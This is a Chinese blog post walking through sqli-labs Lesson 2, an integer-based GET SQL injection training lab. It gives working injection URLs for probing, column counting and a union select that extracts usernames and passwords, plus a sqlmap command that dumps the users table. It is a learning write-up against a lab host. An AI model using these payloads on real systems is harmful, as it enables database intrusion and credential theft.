---
title: sqli-labs lession 2 (基于错误的GET整型注入)
date: 2018-09-18 20:23:34
tags: [sqli-labs]
categories: sql注入
---
# sqli-labs lession 2 (基于错误的GET整型注入) #
---
## 登录界面 ##

![1](/img/sql/lesson2/1.png)

## 手注 ##

### 判断注入类型 ###

根据题目提示尝试一下整型注入

`http://10.60.250.214/Less-2/?id=1%20and%201=2`

![2](/img/sql/lesson2/2.png)

果然存在注入点！！

### 获取数据值 ###

这里只是$id的获取方式变化了,查看源码就可以发现SQL变成如下形式了,其他都一样。

![3](/img/sql/lesson2/3.png)

可以构造如下:

`http://10.60.250.214/Less-2/?id=1%20order%20by%204%23`

![4](/img/sql/lesson2/4.png)

`http://10.60.250.214/Less-2/?id=1%20order%20by%203%23`

![5](/img/sql/lesson2/5.png)

这里可以判断出字段数目

`http://10.60.250.214/Less-2/?id=-1%20union%20select%201,2,3%23`

![6](/img/sql/lesson2/6.png)

这些步骤和Lesson-1一致,可以查看这里。

{% post_link sqli-labs-lession-1-基于错误的GET单引号字符型注入 点击查看Lesson-1 %}

直接上图吧。

`http://10.60.250.214/Less-2/?id=-1%20union%20select%201,2,group_concat(username,%27:%27,password)%20from%20users%23`

![7](/img/sql/lesson2/7.png)

## SQLMAP ##

与Lesson-1基本一致,具体流程可以查看这里。

{% post_link sqli-labs-lession-1-基于错误的GET单引号字符型注入 点击查看Lesson-1 %}

这里只填写最后一步。

`sqlmap -u "http://10.60.250.214/Less-2/?id=1" --batch -D security -T users --columns --dump`

![8](/img/sql/lesson2/8.png)

![9](/img/sql/lesson2/9.png)